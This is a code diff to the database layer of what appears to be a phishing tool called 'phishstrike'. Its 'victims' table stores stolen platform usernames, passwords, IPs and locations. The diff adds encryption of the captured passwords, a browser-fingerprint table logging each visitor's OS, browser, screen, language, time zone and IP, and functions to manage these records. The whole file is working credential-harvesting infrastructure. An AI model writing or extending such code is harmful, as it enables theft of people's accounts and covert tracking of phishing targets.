@@ -1,6 +1,10 @@
+import base64
+import hashlib
 import os
 import sqlite3
 from datetime import datetime, timedelta
+
+from cryptography.fernet import Fernet
 
 # BASE_DIR points to repository root
 BASE_DIR = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
@@ -25,6 +29,24 @@ def _connect() -> sqlite3.Connection:
     return sqlite3.connect(_db_path())
 
 
+def _get_fernet() -> Fernet:
+    from phishstrike.core.config import Config
+
+    raw = hashlib.sha256(Config.SECRET_KEY.encode()).digest()
+    return Fernet(base64.urlsafe_b64encode(raw))
+
+
+def _encrypt(text: str) -> str:
+    return _get_fernet().encrypt(text.encode()).decode()
+
+
+def _decrypt(token: str) -> str:
+    try:
+        return _get_fernet().decrypt(token.encode()).decode()
+    except Exception:
+        return token
+
+
 def init_db():
     conn = _connect()
     cursor = conn.cursor()
@@ -39,6 +61,20 @@ def init_db():
             timestamp DATETIME,
             user_agent TEXT,
             location TEXT
+        )
+    """)
+
+    cursor.execute("""
+        CREATE TABLE IF NOT EXISTS fingerprints (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            os TEXT,
+            browser TEXT,
+            screen_width INTEGER,
+            screen_height INTEGER,
+            language TEXT,
+            time_zone TEXT,
+            timestamp DATETIME,
+            ip TEXT
         )
     """)
 
@@ -58,15 +94,31 @@ def purge_old_victims() -> int:
 
     cutoff = (datetime.now() - timedelta(days=days)).strftime("%Y-%m-%d %H:%M:%S")
     conn = _connect()
-    cursor = conn.execute("DELETE FROM victims WHERE timestamp < ?", (cutoff,))
-    deleted = cursor.rowcount
+    conn.execute("DELETE FROM victims WHERE timestamp < ?", (cutoff,))
     conn.commit()
+    deleted = conn.total_changes
     conn.close()
     return deleted
 
 
 def _decrypt_victim_row(row: tuple) -> tuple:
-    return row
+    from phishstrike.core.config import Config
+
+    if not Config.CAPTURE_ENCRYPT:
+        return row
+    lst = list(row)
+    if lst[3]:
+        lst[3] = _decrypt(lst[3])
+    return tuple(lst)
+
+
+def _maybe_encrypt(password: str | None) -> str | None:
+    from phishstrike.core.config import Config
+
+    if not Config.CAPTURE_ENCRYPT or not password:
+        return password
+    return _encrypt(password)
+
 
 def add_victim(
     platform, username, password, ip, user_agent="Unknown", location="Unknown"
@@ -78,7 +130,7 @@ def add_victim(
         INSERT INTO victims (platform, username, password, ip, timestamp, user_agent, location)
         VALUES (?, ?, ?, ?, ?, ?, ?)
     """,
-        (platform, username, password, ip, timestamp, user_agent, location),
+        (platform, username, _maybe_encrypt(password), ip, timestamp, user_agent, location),
     )
     conn.commit()
     conn.close()
@@ -159,3 +211,85 @@ def get_stats():
     ).fetchall()
     conn.close()
     return {"total": total, "platforms": platform_stats}
+
+
+def add_fingerprint(os, browser, screen_width, screen_height, language, time_zone, ip):
+    conn = _connect()
+    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    conn.execute(
+        """
+        INSERT INTO fingerprints (os, browser, screen_width, screen_height, language, time_zone, timestamp, ip)
+        VALUES (?, ?, ?, ?, ?, ?, ?, ?)
+    """,
+        (os, browser, screen_width, screen_height, language, time_zone, timestamp, ip),
+    )
+    conn.commit()
+    conn.close()
+
+
+def get_all_fingerprints():
+    conn = _connect()
+    rows = conn.execute("SELECT * FROM fingerprints ORDER BY timestamp DESC").fetchall()
+    conn.close()
+    return rows
+
+
+def delete_fingerprint(fingerprint_id):
+    conn = _connect()
+    conn.execute("DELETE FROM fingerprints WHERE id = ?", (fingerprint_id,))
+    conn.commit()
+    conn.close()
+
+
+def clear_all_fingerprints():
+    conn = _connect()
+    conn.execute("DELETE FROM fingerprints")
+    conn.commit()
+    conn.close()
+
+
+def reset_fingerprint_ids():
+    """Reset all IDs to start from 1 in sequential order for fingerprints"""
+    conn = _connect()
+    cursor = conn.cursor()
+    
+    # Get all fingerprints ordered by timestamp
+    cursor.execute("SELECT * FROM fingerprints ORDER BY timestamp ASC")
+    rows = cursor.fetchall()
+    
+    # Create a mapping of old IDs to new IDs
+    old_to_new = {}
+    for idx, row in enumerate(rows, 1):
+        old_id = row[0]
+        old_to_new[old_id] = idx
+    
+    # Create a new table with the same structure
+    cursor.execute("""
+        CREATE TABLE fingerprints_new (
+            id INTEGER PRIMARY KEY AUTOINCREMENT,
+            os TEXT,
+            browser TEXT,
+            screen_width INTEGER,
+            screen_height INTEGER,
+            language TEXT,
+            time_zone TEXT,
+            timestamp DATETIME,
+            ip TEXT
+        )
+    """)
+    
+    # Copy data with new IDs
+    for row in rows:
+        old_id = row[0]
+        new_id = old_to_new[old_id]
+        cursor.execute("""
+            INSERT INTO fingerprints_new (id, os, browser, screen_width, screen_height, language, time_zone, timestamp, ip)
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
+        """, (new_id, row[1], row[2], row[3], row[4], row[5], row[6], row[7], row[8]))
+    
+    # Drop old table and rename new table
+    cursor.execute("DROP TABLE fingerprints")
+    cursor.execute("ALTER TABLE fingerprints_new RENAME TO fingerprints")
+    
+    conn.commit()
+    conn.close()
